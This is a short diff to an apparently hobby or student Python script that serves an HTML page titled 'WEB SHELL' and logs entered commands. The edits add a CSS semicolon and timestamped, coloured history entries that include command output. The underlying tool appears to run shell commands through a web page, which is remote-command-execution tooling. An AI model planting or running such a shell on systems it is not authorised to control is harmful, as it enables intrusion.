@@ -17,7 +17,7 @@ res2 = """
 <head>
     <title>WEB SHELL 1</title>
 </head>
-<body style="background-color:black;color:#00FA16">
+<body style="background-color:black;color:#00FA16;">
 	<h1 style="text-align:center"></u><strong>WEB SHELL</strong></u></h1><br>
 	<h3><u>HISTORY</u></h3> 
 	$(HISTORY)<br>
@@ -96,8 +96,8 @@ def	get_cmd() :
 		os.write(1, bytes(msg, 'utf8'))
 		#WRITE IN HISTORY
 		if (len(data) > 0) :
-			os.write(fd, bytes(data,'utf8'))
-			os.write(fd, bytes('\n', 'utf8'))
+			os.write(fd, bytes("<font color='orange'>" + time.strftime("%d/%m/%Y %H:%M:%S") + "$</font> " + data + '\n','utf8'))
+			os.write(fd, bytes(res_cmd.replace(str(rd_nb), ""), 'utf8'))
 		os.close(fd)
 		return (data, history)
 	exit (0)
